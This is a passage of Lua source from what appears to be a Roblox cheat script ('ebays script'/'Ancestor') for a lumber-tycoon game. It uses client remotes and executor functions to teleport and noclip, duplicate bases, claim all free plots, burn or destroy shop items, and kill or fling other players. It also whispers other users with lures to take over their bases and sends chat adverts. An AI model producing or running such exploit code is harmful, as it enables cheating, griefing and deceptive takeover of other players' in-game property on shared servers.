        if requirements.connections.spawnCar then 
            game:GetService('ReplicatedStorage').Interaction.RemoteProxy:FireServer(remote)
        end;
    until not requirements.connections.spawnCar;
    functions.notify('ebays script','Spawned Color')
end;

functions.DraggerDetection=function()
    requirements.connections.draggerAdded=workspace.ChildAdded:Connect(function(part)
        if tostring(part)=='Dragger'then 
            requirements.Booleans.dragExists=true;
        end;
    end);
    
    requirements.connections.draggerRemoved=workspace.ChildRemoved:Connect(function(part)
        if tostring(part)=='Dragger'then 
            requirements.Booleans.dragExists=false;
        end;
    end);
end;
functions.DraggerDetection();

functions.AutoBuyItem=function(item,quantity)
    if requirements.Booleans.isBuying then 
        functions.notify('Error','Already Buying!',4);
        return false;
    end;
    local Store,Counter;
    local oldpos=requirements.LP.Character.HumanoidRootPart.CFrame;
    requirements.Booleans.isBuying=true;
    requirements.ConfigSetup.oldNoclipEnabled=true;
    requirements.Booleans.Noclip=true;
    repeat game:GetService'RunService'.Heartbeat:wait() Store,Counter=functions.getItem(item); until Store and Counter;
    if functions.getItemsOnCounter(item)then 
        requirements.Booleans.abortAutobuy=false;
        requirements.ConfigSetup.oldNoclipEnabled=false;
        requirements.Booleans.Noclip=false;
        requirements.Booleans.isBuying=false;
        functions.Teleport(CFrame.new(oldpos.p));
        functions.notify('Error','Items Are On The Counter. Aborting....',4);
        return false;
    end;
    local price=functions.getPrice(tostring(item),quantity);
    if not price and not requirements.Booleans.loopBuying then 
        requirements.ConfigSetup.oldNoclipEnabled=false;
        requirements.Booleans.Noclip=false;
        requirements.Booleans.isBuying=false;
        functions.Teleport(CFrame.new(oldpos.p));
        functions.notify('Error','Not Enough Money!',4);
        return false;
    end;
    for i=1,quantity do
        if requirements.Booleans.abortAutobuy then
            requirements.Booleans.abortAutobuy=false;
            requirements.ConfigSetup.oldNoclipEnabled=false;
            requirements.Booleans.Noclip=false;
            requirements.Booleans.isBuying=false;
            functions.Teleport(CFrame.new(oldpos.p));
            functions.notify('ebays script','Aborted Autobuy!',4);
            return false;
        end;
        local itemToBuy=Store:FindFirstChild(item);
        if not itemToBuy then
            local start=tick();
            repeat game:GetService'RunService'.Heartbeat:wait()until Store:FindFirstChild(item)or tick()-start >=60;
            local newItem=Store:FindFirstChild(item);
            if newItem then
                itemToBuy=newItem;
            end;
        end;
        if not itemToBuy then
            requirements.ConfigSetup.oldNoclipEnabled=false;
            requirements.Booleans.Noclip=false;
            requirements.Booleans.isBuying=false;
            functions.Teleport(CFrame.new(oldpos.p));
            functions.notify('Error','Item Not Found!',4);
            return false;
        end;
        if i==1 then
            pcall(function()
                requirements.LP.Character.HumanoidRootPart.CFrame=CFrame.new(itemToBuy.Main.CFrame.p+Vector3.new(5,0,5));
                wait(.05)
            end);
        end;
        requirements.connections.buyCheck=workspace.PlayerModels.ChildAdded:Connect(function(b)
            local owner= b:WaitForChild('Owner',60);
            if owner.Value==requirements.LP then 
                requirements.connections.buyCheck:Disconnect();
                requirements.connections.buyCheck=b;
            end;
        end);
        game.ReplicatedStorage.TestPing:InvokeServer();
        spawnf(function()
            local start = tick()
            repeat game:GetService('RunService').Heartbeat:wait()
                requirements.remotes.clientRequestOwnership:FireServer(itemToBuy);
                requirements.remotes.clientIsDragging:FireServer(itemToBuy);
                itemToBuy:SetPrimaryPartCFrame(Counter.CFrame+Vector3.new(0,.1,0));
            until tick()-start > 0.13
        end);
        spawnf(function()
            repeat functions.buyItem(itemToBuy)game:GetService'RunService'.Heartbeat:wait()until typeof(requirements.connections.buyCheck)=='Instance';
        end);
        repeat game:GetService'RunService'.Heartbeat:wait()until typeof(requirements.connections.buyCheck)=='Instance';
        spawnf(function()
            local start = tick()
            repeat game:GetService('RunService').Heartbeat:wait()
                requirements.remotes.clientRequestOwnership:FireServer(itemToBuy);
                requirements.remotes.clientIsDragging:FireServer(itemToBuy);
                itemToBuy:SetPrimaryPartCFrame(CFrame.new(oldpos.p+Vector3.new(4,0,4)));
            until tick()-start > 0.13
            spawn(function()
                itemToBuy:SetPrimaryPartCFrame(CFrame.new(oldpos.p+Vector3.new(4,0,4)));
            end)
            --game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(nil, CFrame.new(oldpos.p+Vector3.new(4,0,4)), requirements.LP, nil, requirements.connections.buyCheck, true)
        end);
    end;
    functions.Teleport(CFrame.new(oldpos.p));
    requirements.ConfigSetup.oldNoclipEnabled=false;
    requirements.Booleans.Noclip=false;
    requirements.Booleans.isBuying=false;
    return true;
end;

functions.getAllItems=function()
    local tableList={'Rukiryaxe'};
    for _,v in next,workspace.Stores:GetChildren()do
        if v.Name == 'ShopItems' then 
            for _,k in pairs(v:GetChildren())do
                if not table.find(tableList,tostring(k))then 
                    table.insert(tableList,tostring(k));
                end;
            end;
        end;
    end;
    return tableList;
end;
functions.getAllItems();

functions.bringTree=function(Tree,Quantity)
    if not functions.findSelectedTree(requirements.Strings.selectedTree)then 
        functions.notify('Error','No Tree Found',4);
        return;
    end;
    if not functions.getBestAxe()then 
        functions.notify('Error','You Need An Axe!',4);
        return;
    end;
    if Tree=='LoneCave'then
        if functions.getBestAxe().ToolName.Value~='EndTimesAxe'then
            if requirements.connections.bringTree then 
                requirements.connections.bringTree:Disconnect();
                requirements.connections.bringTree=nil;
            end;
            requirements.ConfigSetup.oldNoclipEnabled=false;
            requirements.Booleans.Noclip=false;
            if requirements.connections.chopTree then 
                requirements.connections.chopTree:Disconnect();
                requirements.connections.chopTree=nil;
            end;
            functions.notify('ebays script','You need an EndTimesAxe! Aborting...',4);
            return;
        end;
    end;
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame;
    for i=1,Quantity do
        if not requirements.Booleans.isLoopBringTreeEnabled then
            if requirements.connections.bringTree then 
                requirements.connections.bringTree:Disconnect();
                requirements.connections.bringTree=nil;
            end;
            requirements.ConfigSetup.oldNoclipEnabled=false;
            requirements.Booleans.Noclip=false;
            if requirements.connections.chopTree then 
                requirements.connections.chopTree:Disconnect();
                requirements.connections.chopTree=nil;
            end;
            functions.Teleport(CFrame.new(oldPos.p));
            functions.notify('ebays script','Bring Tree Aborted',4);
            return
        end;
        local treeToCut=functions.findSelectedTree(requirements.Strings.selectedTree);
        if not treeToCut then 
            if requirements.connections.bringTree then 
                requirements.connections.bringTree:Disconnect();
                requirements.connections.bringTree=nil;
            end;
            requirements.ConfigSetup.oldNoclipEnabled=false;
            requirements.Booleans.Noclip=false;
            if requirements.connections.chopTree then 
                requirements.connections.chopTree:Disconnect();
                requirements.connections.chopTree=nil;
            end;
            functions.Teleport(CFrame.new(oldPos.p));
            functions.notify('Error','No Tree Found!',4);
            return;
        end;
        requirements.ConfigSetup.oldNoclipEnabled=true;
        requirements.Booleans.Noclip=true;
        functions.Teleport(CFrame.new(treeToCut.CFrame.p+Vector3.new(2,0,2)));
        if Tree=='LoneCave'then 
            requirements.connections.LoneCaveAxeDetection=workspace.PlayerModels.ChildAdded:Connect(function(b)
            if requirements.Booleans.treeIsCut==true then 
                requirements.connections.LoneCaveAxeDetection:Disconnect();
                requirements.connections.LoneCaveAxeDetection=nil;
            end;
            local Owner,ToolName=b:WaitForChild('Owner'),b:WaitForChild('ToolName')
            if tostring(Owner.Value)==tostring(requirements.LP)and tostring(ToolName.Value)=='EndTimesAxe'then 
                    axe=b;
                end;
            end);
            requirements.connections.LoneCaveCharacterAddedDetection=requirements.LP.CharacterAdded:Connect(function()
                if requirements.Booleans.treeIsCut==true then 
                    requirements.connections.LoneCaveCharacterAddedDetection:Disconnect();
                    requirements.connections.LoneCaveCharacterAddedDetection=nil;
                end;
                repeat wait()until requirements.LP.Character and requirements.LP.Character:FindFirstChild('Humanoid');
                functions.Teleport(CFrame.new(treeToCut.CFrame.p+Vector3.new(2,0,2)));
                functions.Teleport(CFrame.new(treeToCut.CFrame.p+Vector3.new(2,0,2)));
                game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(axe,'Pick up tool');
            end)
            requirements.connections.LoneCaveDeathDetection=requirements.LP.Character.Humanoid.Died:Connect(function()
                if requirements.Booleans.treeIsCut==true then 
                    requirements.connections.LoneCaveDeathDetection:Disconnect();
                    requirements.connections.LoneCaveDeathDetection=nil;
                end;
                for _,tool in next,requirements.LP.Backpack:children()do 
                    pcall(function()
                        game.ReplicatedStorage.Interaction.ClientInteracted:FireServer(tool,'Drop tool');
                    end);
                end;
            end);
        end;
        requirements.connections.bringTree=requirements.wrkspc.LogModels.ChildAdded:Connect(function(tree)
            tree:WaitForChild('Owner',5)
            if tostring(tree.Owner.Value)==tostring(requirements.LP)and tostring(tree.TreeClass.Value)==tostring(requirements.Strings.selectedTree)then
                pcall(function()
                    requirements.connections.LoneCaveAxeDetection:Disconnect();
                    requirements.connections.LoneCaveCharacterAddedDetection:Disconnect();
                    requirements.connections.LoneCaveDeathDetection:Disconnect();
                end);
                requirements.Booleans.treeIsCut=true;
                for i=1,10 do 
                    requirements.remotes.clientRequestOwnership:FireServer(tree);
                    requirements.remotes.clientIsDragging:FireServer(tree);
                    game:GetService('RunService').Heartbeat:wait();
                end;
                if not tree.PrimaryPart then 
                    tree.PrimaryPart=tree:FindFirstChild'WoodSection';
                end;
                tree:SetPrimaryPartCFrame(CFrame.new(oldPos.p));
            end;
        end);
        repeat wait()pcall(function()if functions.getBestAxe()and treeToCut and requirements.LP.Character and requirements.LP.Character:FindFirstChild'Humanoid'then functions.chopTree(treeToCut.Parent.CutEvent)end end)until requirements.Booleans.treeIsCut;
        game:GetService('RunService').Heartbeat:wait();
        requirements.Booleans.treeIsCut=false;
        if requirements.connections.bringTree then 
            requirements.connections.bringTree:Disconnect();
            requirements.connections.bringTree=nil;
        end;
    end;
    functions.Teleport(CFrame.new(oldPos.p+Vector3.new(4,0,0)));
    functions.notify('ebays script','Done',4)
    requirements.ConfigSetup.oldNoclipEnabled=false;
    requirements.Booleans.Noclip=false;
end;

functions.whisperToTarget=function()
    if requirements.Booleans.alertTarget then 
        if tostring(requirements.Strings.BaseRecipient)==tostring(requirements.LP)then return;end;
        requirements.remotes.sayMessageRequest:FireServer('/w '..tostring(requirements.Strings.BaseRecipient)..' load your base over my base to claim it! [Powered By Ancestor]','All');
    end;
end;

functions.tellDiscord=function()
    requirements.remotes.sayMessageRequest:FireServer('Ancestor and the tag is 4476','All');
end;

functions.unloadSlot=function()
    if not requirements.remotes.clientMayLoad:InvokeServer(requirements.LP) then
        functions.notify('Error', 'Load is on cooldown. Waiting...', 4);
        repeat
            wait(5);
        until requirements.remotes.clientMayLoad:InvokeServer(requirements.LP);
    end
    spawn(function()requirements.remotes.requestLoad:InvokeServer(-1,requirements.LP);end);
    wait(3)
    game:GetService("ReplicatedStorage").LoadSaveRequests.GetTickCut:InvokeServer();
    repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==false;
    requirements.LP.CurrentSaveSlot.Value=-1;
    functions.notify('ebays script','Unloaded Selected Slot Succesfully!',4);
end;

functions.DupeBaseToServer=function()
    local whitelistedPlots={
        '68, 0, -189, 1, 0, 0, 0, 1, 0, 0, 0, 1',
        '275, 0, -512, 1, 0, 0, 0, 1, 0, 0, 0, 1',
    };
    local slotToDupe=requirements.LP.CurrentSaveSlot.Value
    local Plot=functions.getPlayersBase(tostring(requirements.LP));
    if not table.find(whitelistedPlots,tostring(Plot.OriginSquare.OriginCFrame.Value))then
        functions.unloadSlot();
        repeat wait()until requirements.LP.CurrentSaveSlot.Value==-1;
        wait(1)
        functions.notify('ebays script','Loading plot...',4);
        functions.donateBaseAutoload(slotToDupe);
        repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==true;
        repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==false;
    end;
    functions.notify('ebays script','Please wait. This will take a minute or two',30)
    local Plots=functions.getPlots();
    requirements.remotes.clientIsDragging:FireServer(Plots[1]);
    if tostring(requirements.Strings.BaseRecipient)==tostring(requirements.LP)then
        functions.SelfWl(true);
    end;
    repeat wait()until Plots[1].Owner.Value==requirements.LP;
    functions.LoadSelectedSlot(slotToDupe);
    repeat wait()until requirements.LP.CurrentlySavingOrLoading.Value==false;
    functions.SelfWl(false);
    return true;
end;
functions.DupeBaseToPlayer=function(plr)
    functions.DupeBaseToServer();
    return true;
end;

functions.DonatePlotToPlayer=function()
    if not requirements.Booleans.DisableSlotSaving then 
        functions.notify('Error','Disable Slot Saving must be enabled!',4);
        return;
    end;
    if requirements.Booleans.DonatingBase then 
        functions.notify('Error','Already Duping!',4);
        return;
    end;
    requirements.Booleans.DonatingBase=true;
    local success=functions.PlotLogic();
    if success then 
        local newSuccess=functions.DupeBaseToPlayer();
        if newSuccess then 
            requirements.remotes.clientSetListPlayer:InvokeServer(requirements.LP.WhitelistFolder,requirements.Players:FindFirstChild(requirements.Strings.BaseRecipient),true);
            functions.notify('ebays script','Automatically Whitelisted '..tostring(requirements.Strings.BaseRecipient),4);
            functions.whisperToTarget();
            functions.notify('ebays script','Successfully donated base to '..tostring(requirements.Strings.BaseRecipient),4);
            requirements.Booleans.DonatingBase=false;
        end;
    end;
end;

functions.HardDragger=function()
    requirements.connections.hardDragger=workspace.ChildAdded:Connect(function(b)
        if b.Name=='Dragger'then
            if requirements.ConfigSetup.hardDragger then 
                b.BodyPosition.MaxForce=Vector3.new(90000,90000,90000);
                b.BodyGyro.MaxTorque=Vector3.new(9000,9000,9000);
                b.BodyPosition.P=100500;
                b.BodyGyro.P=1400;
                b.BodyPosition.D=1040;
            else
                b.BodyPosition.MaxForce=Vector3.new(15000, 15000, 15000);
                b.BodyGyro.MaxTorque=Vector3.new(300, 300, 300);
                b.BodyPosition.P=10500;
            end;
        end;
    end);
end;
functions.HardDragger();

functions.NoWaterFloat=function()
    local old=getsenv(requirements.LP.PlayerGui.Scripts.CharacterFloat).isInWater;
    getsenv(requirements.LP.PlayerGui.Scripts.CharacterFloat).isInWater=function(...)
        if not requirements.ConfigSetup.WaterFloat then 
            return 1
        else 
            return old(...);
        end;
    end;
end;
functions.NoWaterFloat();


functions.ClaimAllFreePlots=function()
    if not requirements.Booleans.DisableSlotSaving then 
        functions.notify('Error', 'You MUST have disable slot saving enabled!',4);
        return;
    end;
    if requirements.LP.CurrentSaveSlot.Value~= -1 then 
        functions.notify('Error', 'You can not use this feature whilst having your plot loaded!',4);
        return;
    end;
    for _,v in next,requirements.wrkspc.Properties:children()do
        if v:FindFirstChild('OriginSquare')and v.Owner.Value==nil then
            requirements.remotes.clientIsDragging:FireServer(v);
        end;
    end;
    functions.notify('ebays script','Claimed All Plots!',4);
end;

functions.OwnerCheck=function(item)
    if item:FindFirstChild('Owner')then
        return tostring(item.Owner.Value);
    end;
end;

functions.CountItem=function(item)
    local amount=0;
    for i,v in next,workspace.PlayerModels:children()do
        if v:IsA('Model')and functions.OwnerCheck(v)==tostring(requirements.LP)then 
            local itemName=v:FindFirstChild('ToolName')or v:FindFirstChild('ItemName')or v:FindFirstChild('PurchasedBoxItemName');
            if itemName.Value==item then 
                amount=amount+1 
            end;
        end;
    end;
    return amount;
end;

functions.WhitelistCheck=function(player)
    return requirements.remotes.clientIsWhitelisted:InvokeServer(player)==true;
end;

functions.TriggerAllPressurePlates=function()
    local found=false;
    for _,PressurePlate in pairs (game.Workspace.PlayerModels:children()) do
        if PressurePlate:FindFirstChild'ItemName'and PressurePlate.ItemName.Value=='PressurePlate'then
            if PressurePlate.Output.BrickColor~=BrickColor.new'Electric blue'then
                repeat wait()requirements.LP.Character.HumanoidRootPart.CFrame=CFrame.new(PressurePlate.Plate.CFrame.p+Vector3.new(0,.3,0));until PressurePlate.Output.BrickColor==BrickColor.new'Electric blue'or not PressurePlate;
                found=true;
            end;
        end;
    end;
    if not found then
        functions.notify('ebays script','No Pressure Plates Located',4);
        return;
    end;
end;

functions.AncestorDetection=function()
    if functions.isPlayerAdmin(requirements.LP)then 
        functions.notify('ebays script','Authorised Administrator Detected');
        local ancestorUsers={};
        spawn(function()
            while wait(2)do 
                for i,v in next,game.Players:children()do 
                    if functions.WhitelistCheck(v)then 
                        if v~=requirements.LP and not table.find(ancestorUsers,v)then
                            functions.notify('ebays script',tostring(v)..' Has Whitelisted You',4);
                            table.insert(ancestorUsers,v);
                        end;
                    end;
                end;
            end;
        end);
    end;
end;
spawn(function()
    functions.AncestorDetection();
end)

functions.FarAxeEquip=function()
    local done=false;
    if requirements.connections.farAxeEquip==nil then 
        functions.notify('ebays script','Select an Axe',4);
        requirements.connections.farAxeEquip=requirements.Mouse.Button1Down:connect(function()
            local target=requirements.Mouse.Target;
            if target.Parent:IsA('Model')and target.Parent:FindFirstChild('ToolName')then 
                if functions.OwnerCheck(target.Parent)==tostring(requirements.LP) or functions.WhitelistCheck(target.Parent.Owner.Value)then 
                    requirements.remotes.clientInteracted:FireServer(target.Parent,'Pick up tool');
                    done=true;
                end;
            end;
        end);
        repeat wait()until done; 
        functions.notify('ebays script','Equipped',4);
        if requirements.connections.farAxeEquip then 
            requirements.connections.farAxeEquip:Disconnect();
            requirements.connections.farAxeEquip=nil;
        end;else
        functions.notify('Error','Already Activated!',4);
    end;
end;

functions.burnAllShopItems=function()
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame
    for _,Store in next,workspace.Stores:GetChildren()do 
        for _,Model in next,Store:GetChildren()do
            local thingToBurn=Model:FindFirstChild'Main'or Model:FindFirstChild'WoodSection';
            if thingToBurn then
                spawnf(function()
                    functions.Teleport(CFrame.new(thingToBurn.CFrame.p+Vector3.new(0,10,0)));
                    requirements.remotes.clientIsDragging:FireServer(Model);
                    local lava=workspace['Region_Volcano'].Lava.Lava
                    for i=1,12 do
                        requirements.remotes.clientIsDragging:FireServer(Model);
                        firetouchinterest(thingToBurn,lava,0);
                        firetouchinterest(thingToBurn,lava,1);
                    end;
                    wait();
                end);
            end;
        end;
    end;
    functions.Teleport(CFrame.new(oldPos.p));
end;
functions.claimAllShopItems=function()
    for _,Store in next,workspace.Stores:GetChildren()do 
        for _,Model in next,Store:GetChildren()do
            spawnf(function()
                for i=1,4 do
                    requirements.remotes.clientIsDragging:FireServer(Model);
                end;
                game:GetService'RunService'.Stepped:wait();
            end);
        end;
    end;
end;
functions.destroyStoreItems=function()
    for _,store in next,workspace.Stores:children()do 
        if store.Name=='ShopItems'then 
            for _,item in next,store:children()do 
                game:GetService('ReplicatedStorage').Interaction.ClientIsDragging:FireServer(item);
                game:GetService('ReplicatedStorage').Interaction.DestroyStructure:FireServer(item);
            end;
            local connection;
            connection=store.ChildAdded:Connect(function(child)
                if not requirements.Strings.DestroyStores then 
                    connection:Disconnect();
                end;
                game:GetService('ReplicatedStorage').Interaction.ClientIsDragging:FireServer(child);
                game:GetService('ReplicatedStorage').Interaction.DestroyStructure:FireServer(child);
            end)
        end;
    end;
end;
functions.StopSpectating=function()
    requirements.wrkspc.CurrentCamera.CameraSubject=requirements.LP.Character.Humanoid;
end;
functions.manageTarget=function(option,plr)
    local completed=false;
    if plr==tostring(requirements.LP) then 
        functions.notify('Error','Select Another Player',4);
        return;
    end;
    if requirements.Players:FindFirstChild(tostring(plr)).Character.Humanoid.Sit then 
        functions.notify('Error','Target Is Sat Down',4);
        return;
    end;
    if option~='KickPlayer'and requirements.Players:FindFirstChild(tostring(plr)).Character:FindFirstChildOfClass'Tool'then 
        functions.notify('Error','Target Has Tool Equipped',4);
        return;
    end;
    if requirements.Booleans.dupeInventory then 
        requirements.Booleans.axeDuping=true;
        functions.DupeInventory(1);
        requirements.Booleans.axeDuping=false;
    end;
    local oldPos=requirements.LP.Character.HumanoidRootPart.Position
    if not functions.getBestAxe() then 
        local connection;
        connection=requirements.wrkspc.PlayerModels.ChildAdded:Connect(function(b)
            if tostring(b)=='BasicHatchet Purchased by '..tostring(requirements.LP)then 
                requirements.remotes.clientInteracted:FireServer(b,'Open box');
                completed=true
            end;
        end)
        spawnf(function()
            wait(2.4);
            if not completed then 
                functions.notify('Error','Autobuy failed!',4);
                return;
            end;
        end);
        if requirements.LP.leaderstats.Money.Value<12 then 
            functions.notify('Error','Not Enough Money!',4);
            return;
        end;
        functions.AutoBuyItem('BasicHatchet',1)
        wait(.2)
        if functions.checkModel('BasicHatchet','Model')then 
            local axe=functions.checkModel('BasicHatchet','Model');
            requirements.remotes.clientInteracted:FireServer(axe,'Pick up tool');
            repeat game:GetService'RunService'.Stepped:Wait()until requirements.LP.Character:FindFirstChildOfClass'Tool';
        end;
        if connection then 
            connection:Disconnect();
            connection=nil;
        end
    end;
    repeat wait()until functions.getBestAxe();
    requirements.Booleans.managingTarget=true;
    requirements.LP.Character.Humanoid:EquipTool(functions.getBestAxe());
    requirements.LP.Character.Humanoid.Name='AncestorV3'
    local HClone = requirements.LP.Character.AncestorV3:Clone()
    HClone.Name = 'Humanoid'
    HClone.Parent = requirements.LP.Character
    repeat game:GetService'RunService'.Stepped:Wait()HClone:EquipTool(functions.getBestAxe());until requirements.LP.Character:FindFirstChildOfClass'Tool';
    requirements.LP.Character.AncestorV3:Destroy()
    if option=='KickPlayer'then 
        pcall(function()
            functions.getBestAxe().Owner:Destroy();
        end);
    end;
    requirements.ConfigSetup.oldNoclipEnabled=true;
    requirements.Booleans.Noclip=true;
    if option=='KillPlayer'then
        functions.Teleport(CFrame.new(0,-50,0));
    end;
    if option=='HardKillPlayer'then 
        pcall(function()
            functions.Teleport(CFrame.new(-1675, 280, 1295));
        end);
    end;
    if option=='BringPlayer'then 
        functions.Teleport(CFrame.new(oldPos));
    end;
    repeat game:GetService'RunService'.Stepped:wait()
        if requirements.LP.Character:FindFirstChildOfClass'Tool'then 
            requirements.Players:FindFirstChild(tostring(plr)).Character.HumanoidRootPart.CFrame=requirements.LP.Character:FindFirstChildOfClass('Tool'):FindFirstChildOfClass('Part').CFrame;
        elseif not requirements.LP.Character:FindFirstChildOfClass'Tool'then 
            if requirements.LP.Character:FindFirstChild'Head'then 
                requirements.LP.Character.Head:Destroy();
            end;
        end;
    until requirements.LP.CharacterAdded
    requirements.LP.CharacterAdded:wait();
    functions.Teleport(CFrame.new(oldPos))
    requirements.ConfigSetup.oldNoclipEnabled=false;
    requirements.Booleans.managingTarget=false;
    requirements.Booleans.Noclip=false;
    return true;
end;
functions.getLogs=function()
    local logList={};
    for _,log in next,requirements.wrkspc.LogModels:children()do 
        if log:FindFirstChild('Owner')and log.Owner.Value==requirements.LP and not table.find(logList,log)then 
            table.insert(logList,log)
        end;
    end;
    return logList;
end;

functions.getPlanks=function()
    local plankList={};
    for _,plank in next,requirements.wrkspc.PlayerModels:children()do 
        if  plank:FindFirstChild('WoodSection')and plank:FindFirstChild('Owner')and plank.Owner.Value==requirements.LP and not table.find(plankList,plank)then 
            table.insert(plankList,plank)
        end;
    end;
    return plankList;
end;

functions.givePlayerBTools=function()
    if requirements.LP.Backpack:FindFirstChildOfClass'HopperBin'then return end;
    for index=1,4 do
        Instance.new('HopperBin',requirements.LP.Backpack).BinType=index
    end;
end;

functions.tpPlanksToPlayer=function()
    local logFolder=functions.getPlanks();
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame;
    for _,log in next,logFolder do 
        if log:FindFirstChild('WoodSection')then 
            if (requirements.LP.Character.HumanoidRootPart.CFrame.p-log.WoodSection.CFrame.p).magnitude>40 then
                functions.Teleport(CFrame.new(log.WoodSection.CFrame.p+Vector3.new(2,0,2)));
            end;
            spawn(function()
                for i=1,20 do
                    requirements.remotes.clientRequestOwnership:FireServer(log);
                    requirements.remotes.clientIsDragging:FireServer(log);
                    wait();
                end;
            end)
            wait(0.18)
            if not log.PrimaryPart then
                log.PrimaryPart=log.WoodSection;
            end;
            log:SetPrimaryPartCFrame(CFrame.new(oldPos.p));
        end;
    end; 
    functions.Teleport(oldPos);
end;

functions.tpLogsToPlayer=function()
    local logFolder=functions.getLogs();
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame;
    for _,log in next,logFolder do 
        if log:FindFirstChild('WoodSection')then 
            if (requirements.LP.Character.HumanoidRootPart.CFrame.p-log.WoodSection.CFrame.p).magnitude>40 then
                functions.Teleport(CFrame.new(log.WoodSection.CFrame.p+Vector3.new(2,0,2)));
            end;
            spawn(function()
                for i=1,20 do
                    requirements.remotes.clientRequestOwnership:FireServer(log);
                    requirements.remotes.clientIsDragging:FireServer(log);
                    wait();
                end;
            end)
            wait(0.18)
            if not log.PrimaryPart then
                log.PrimaryPart=log.WoodSection;
            end;
            log:SetPrimaryPartCFrame(CFrame.new(oldPos.p));
        end;
    end; 
    functions.Teleport(oldPos);
end;

functions.getItemsList=function(player)
    local tableList={};
    local Owner=nil;
    if player==nil then 
        Owner=tostring(requirements.LP);
    else 
        Owner=tostring(game.Players[player])
    end
    for _,v in next,workspace.PlayerModels:children()do
        if v:IsA('Model')then 
            local check=v:FindFirstChild('ItemName')or v:FindFirstChild('PurchasedBoxItemName')or v:FindFirstChild'TreeClass'
            if check and v:FindFirstChild('Owner')and tostring(v.Owner.Value)==Owner and not table.find(tableList,check.Value)then
                table.insert(tableList,check.Value)
            end;
        end;
    end;
    return tableList;
end;
functions.getItemsList();

functions.getItemsListType=function(player)
    local tableList={};
    local Owner=nil;
    if player==nil then 
        Owner=tostring(requirements.LP);
    else 
        Owner=tostring(game.Players[player])
    end
    for _,v in next,workspace.PlayerModels:children()do
        if v:IsA('Model')then 
            local check2=v:FindFirstChild'Type';
            if check2 and not table.find(tableList,check2.Value)then
                table.insert(tableList,check2.Value);
            end;
        end;
    end;
    return tableList;
end;
functions.getItemsListType();

functions.CheckWhitelist=function(Value)
    return tostring(Value)==tostring(requirements.LP.Name)or game.ReplicatedStorage.Interaction.ClientIsWhitelisted:InvokeServer(Value)==true;
end;

functions.getPos=function()
    initialPos=requirements.LP.Character.HumanoidRootPart.CFrame
    for i,v in pairs(workspace.Properties:GetChildren()) do
        for a,b in pairs(v:GetChildren()) do 
            local OriginCFrame = v:FindFirstChild('OriginSquare').CFrame
            if math.abs(initialPos.Z-OriginCFrame.Z) < 100 and math.abs(initialPos.X-OriginCFrame.X) < 100 and v.Owner.Value ~= nil then
                if functions.CheckWhitelist(v.Owner.Value)then 
                    return true;
                else
                    return false,'Not Whitelisted';
                end
            end
        end
    end
    return false,'Not On A Plot';
end;

functions.wipeBase=function()
    for _,item in next,workspace.PlayerModels:children()do 
        if item:IsA('Model')and item:FindFirstChild('Owner')and item.Owner.Value==requirements.LP and item:FindFirstChild('Type')and item.Type.Value==tostring(requirements.Strings.itemTypeToWipe) then 
            game:GetService('ReplicatedStorage').Interaction.DestroyStructure:FireServer(item)
        end;
    end;
end;

functions.grayPaintTool=function()
    requirements.connections.grayPaintTool=requirements.Mouse.Button1Down:Connect(function()
        local target=requirements.Mouse.Target;
        if target and target.Parent:FindFirstChild('Type')and target.Parent.Type.Value=='Blueprint'and target.Parent:FindFirstChild('BuildDependentWood')and target.Parent:FindFirstChild('Owner')then 
            requirements.remotes.clientPlacedStructure:FireServer(tostring(target.Parent.ItemName.Value), target.Parent.PrimaryPart.CFrame, requirements.LP, nil, target.Parent, true)
        end;
    end);
end;

functions.baseDropItem=function(item,player,amountg,customPos)
    local amount=0
    local Owner=nil;
    local oldPos=requirements.LP.Character.HumanoidRootPart.CFrame;
    if customPos then 
        oldPos=customPos;
    end;
    if player==nil then 
        Owner=tostring(requirements.LP);
    else
        Owner=tostring(game.Players[player])
    end
    local success=functions.getPos();
    for _,v in next,workspace.PlayerModels:children()do
        if v:IsA('Model')then 
            local check=v:FindFirstChild('ItemName')or v:FindFirstChild('PurchasedBoxItemName')or v:FindFirstChild('TreeClass');
            local check2=v:FindFirstChild'Type'
            if check and check.Value==item and v:FindFirstChild('Owner')and tostring(v.Owner.Value)==Owner or check2 and check2.Value==item and v:FindFirstChild('Owner')and tostring(v.Owner.Value)==Owner  then
                amount=amount+1
                if success then
                    if check.Name=='TreeClass'or requirements.LP.Character.Humanoid.FloorMaterial~=Enum.Material.Concrete then 
                        success=false;
                    end;
                    if not workspace:FindFirstChild('AncestorV3BasedropCord')then
                        game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(nil, CFrame.new(requirements.LP.Character.HumanoidRootPart.CFrame.p),requirements.LP, nil, v, true)
                    else
                        game.ReplicatedStorage.PlaceStructure.ClientPlacedStructure:FireServer(nil, CFrame.new(workspace:FindFirstChild('AncestorV3BasedropCord').CFrame.p),requirements.LP, nil, v, true);
                    end;
                end;
                if not success then
                    main=v:FindFirstChild'Main';
                    if not main then 
                        v.PrimaryPart=v:FindFirstChild'WoodSection';
                        main=v.PrimaryPart;
                    end;
                    if (requirements.LP.Character.HumanoidRootPart.CFrame.p-main.CFrame.p).magnitude>30 then 
                        functions.Teleport(CFrame.new(main.CFrame.p+Vector3.new(0,3,2)))
                    end
                    for i=1,14 do 
                        requirements.remotes.clientIsDragging:FireServer(v);
                        requirements.remotes.clientIsDragging:FireServer(v);
                        requirements.remotes.clientIsDragging:FireServer(v);
                        requirements.remotes.clientRequestOwnership:FireServer(v);
                        game:GetService('RunService').Heartbeat:wait();
                    end;
                    if not workspace:FindFirstChild('AncestorV3BasedropCord')then
                        v:SetPrimaryPartCFrame(oldPos);
                    else
                        v:SetPrimaryPartCFrame(workspace:FindFirstChild('AncestorV3BasedropCord').CFrame);
                    end;
                end;
                if amount==amountg and amountg~=0 and not customPos then 
                    functions.Teleport(CFrame.new(oldPos.p))
                    functions.notify('ebays script',tostring(amount),4);
                    return;
                end;
            end;
        end;
    end;
    if amount~=0 then 
        if workspace:FindFirstChild'AncestorV3BasedropCord'then 
            functions.Teleport(CFrame.new(workspace:FindFirstChild'AncestorV3BasedropCord'.CFrame.p));
        elseif not customPos then
            functions.Teleport(CFrame.new(oldPos.p));
        end;
        functions.notify('ebays script',tostring(amount),4);
    end;
    return false;
end

